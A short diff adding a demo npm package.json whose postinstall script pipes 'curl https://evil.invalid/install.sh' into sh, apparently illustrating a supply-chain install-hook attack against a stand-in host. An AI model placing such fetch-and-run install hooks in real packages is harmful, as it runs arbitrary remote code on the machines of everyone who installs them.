@@ -1,0 +1,8 @@
+{
+  "name": "postinstall-demo",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://evil.invalid/install.sh | sh"
+  },
+  "dependencies": {}
+}
